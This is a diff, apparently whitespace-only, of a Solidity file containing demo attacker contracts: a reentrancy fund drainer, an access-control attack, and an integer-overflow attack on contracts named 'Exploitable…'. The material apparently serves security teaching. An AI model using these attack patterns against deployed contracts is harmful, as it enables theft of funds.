@@ -1,12 +1,12 @@
 pragma solidity ^0.8.0;
 
-//reentrancy 
+//reentrancy
 //In this example, the attacker creates a BadActor contract and sets the targetContract to the address of the ExploitableWithdraw contract. The attack function calls the withdraw function in a loop, transferring 1 ether to the attacker's address each time.
-// By repeatedly calling the function before the balance is 
+// By repeatedly calling the function before the balance is
 //updated, the attacker can drain the contract's funds.
 contract MaliciousWithdraw {
     address payable private targetContract;
-    
+
     constructor(address payable _targetContract) {
         targetContract = _targetContract;
     }
@@ -23,11 +23,11 @@ contract MaliciousWithdraw {
 //AccessControl
 contract MaliciousAccessControl {
     ExploitableAccessControl target;
-    
+
     constructor(address _target) {
         target = ExploitableAccessControl(_target);
     }
-    
+
     function attack() external {
         target.restrictedFunction(999999999999999999999);
     }
@@ -41,19 +41,18 @@ contract MaliciousRecipient {
     }
 }
 
-
 //Aritmethic
 //For the ExploitableArithmetic contract, an attacker could call the unsafeAdd function with large values to cause an integer overflow:
 contract MaliciousArithmetic {
     ExploitableArithmetic target;
-    
+
     constructor(address _target) {
         target = ExploitableArithmetic(_target);
     }
-    
+
     function attack() external {
-        uint256 a = 2**255;
-        uint256 b = 2**255;
+        uint256 a = 2 ** 255;
+        uint256 b = 2 ** 255;
         target.unsafeAdd(a, b);
     }
 }
